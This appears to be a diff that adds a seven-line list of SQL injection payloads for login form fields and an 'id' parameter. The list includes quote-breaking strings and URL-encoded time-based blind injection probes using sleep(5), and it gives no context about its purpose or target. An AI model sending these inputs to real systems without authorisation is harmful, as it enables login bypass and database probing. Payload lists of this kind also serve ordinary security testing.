@@ -1,0 +1,7 @@
+submit=submit&nama='&pass='#
+submit=submit&user='admin'&pass='#
+id=%27-sleep%285%29%23#
+?id=%27-sleep%285%29%23#
+?id='
+%27-sleep%285%29%23#
+submit=submit&user=%27-sleep%285%29%23#
